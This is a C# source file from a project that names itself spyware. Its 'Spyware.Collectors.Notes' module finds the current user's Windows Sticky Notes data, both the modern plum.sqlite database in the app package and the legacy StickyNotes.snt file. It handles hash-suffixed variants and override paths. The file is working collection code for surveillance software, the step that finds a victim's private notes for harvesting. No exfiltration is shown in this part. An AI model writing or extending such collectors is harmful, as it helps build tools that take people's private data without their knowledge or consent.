using Spyware.Core.Configuration;
using Spyware.Core.Logging;

namespace Spyware.Collectors.Notes;

public enum NoteStoreKind
{
    /// <summary>Sticky Notes moderno (1709 en adelante): base SQLite dentro del paquete.</summary>
    PlumDatabase = 1,

    /// <summary>Sticky Notes clásico (Windows 7 a 10 &lt; 1607): archivo CFB/OLE.</summary>
    LegacySnt = 2
}

/// <summary>
/// Almacén de notas encontrado (o esperado) para este usuario. <see cref="Exists"/>
/// false significa que la aplicación está instalada pero aún no tiene datos.
/// </summary>
public sealed record NoteStoreHandle(
    NoteStoreKind Kind, string DisplayName, string FilePath, string StoreName, bool Exists)
{
    public bool IsDatabase => Kind == NoteStoreKind.PlumDatabase;
}

/// <summary>
/// Localiza los almacenes de Sticky Notes del usuario actual. Se usan rutas conocidas
/// y el prefijo del paquete, sin depender de la versión exacta de la aplicación.
/// </summary>
public static class StickyNotesSource
{
    public const string PackagePrefix = "Microsoft.MicrosoftStickyNotes";
    public const string DatabaseName = "plum.sqlite";
    public const string LegacyRelativePath = @"Microsoft\Sticky Notes\StickyNotes.snt";

    public static IReadOnlyList<NoteStoreHandle> Discover(NotesSection config, ILog log)
    {
        var stores = new List<NoteStoreHandle>();

        if (config.StickyNotes)
            stores.AddRange(DiscoverDatabases(config, log));

        if (config.LegacySnt)
        {
            NoteStoreHandle? legacy = DiscoverLegacy(config, log);
            if (legacy is not null)
                stores.Add(legacy);
        }

        return stores;
    }

    private static IEnumerable<NoteStoreHandle> DiscoverDatabases(NotesSection config, ILog log)
    {
        if (!string.IsNullOrWhiteSpace(config.DatabaseOverride))
        {
            string custom = Environment.ExpandEnvironmentVariables(config.DatabaseOverride.Trim());
            yield return new NoteStoreHandle(
                NoteStoreKind.PlumDatabase, "plum.sqlite (override)", custom, DatabaseName, File.Exists(custom));

            yield break;
        }

        string packages = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Packages");

        if (!Directory.Exists(packages))
        {
            log.Debug("No existe la carpeta Packages: Sticky Notes no está instalado para este usuario.");
            yield break;
        }

        foreach (string package in EnumerateStickyPackages(packages))
        {
            string localState = Path.Combine(package, "LocalState");
            string database = Path.Combine(localState, DatabaseName);

            string label = Path.GetFileName(package);

            if (File.Exists(database))
            {
                yield return new NoteStoreHandle(NoteStoreKind.PlumDatabase, label, database, DatabaseName, true);
                continue;
            }

            // Algunas versiones dejan la base con un sufijo (plum-<hash>.sqlite) o en otro
            // nivel del paquete: se busca sin recursar todo el paquete.
            string? alternative = FindDatabase(localState) ?? FindDatabase(package);

            yield return alternative is null
                ? new NoteStoreHandle(NoteStoreKind.PlumDatabase, label, database, DatabaseName, false)
                : new NoteStoreHandle(NoteStoreKind.PlumDatabase, label, alternative, Path.GetFileName(alternative), true);
        }
    }

    private static List<string> EnumerateStickyPackages(string packagesRoot)
    {
        try
        {
            return Directory.EnumerateDirectories(packagesRoot, PackagePrefix + "*")
                .OrderBy(path => path, StringComparer.OrdinalIgnoreCase)
                .ToList();
        }
        catch
        {
            // Sin permisos para enumerar Packages (otros paquetes del usuario).
            return [];
        }
    }

    private static string? FindDatabase(string directory)
    {
        try
        {
            if (!Directory.Exists(directory)) return null;

            return Directory.EnumerateFiles(directory, "plum*.sqlite")
                .OrderBy(path => path.Length)
                .FirstOrDefault();
        }
        catch
        {
            return null;
        }
    }

    private static NoteStoreHandle? DiscoverLegacy(NotesSection config, ILog log)
    {
        bool overridden = !string.IsNullOrWhiteSpace(config.LegacyOverride);

        string path = overridden
            ? Environment.ExpandEnvironmentVariables(config.LegacyOverride!.Trim())
            : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LegacyRelativePath);

        bool exists = File.Exists(path);

        // Sin rastro de la versión clásica y sin override: nada que informar.
        if (!overridden && !exists)
        {
            log.Debug("Sticky Notes clásico no instalado: " + path);
            return null;
        }

        return new NoteStoreHandle(
            NoteStoreKind.LegacySnt, "StickyNotes.snt", path, Path.GetFileName(path), exists);
    }
}
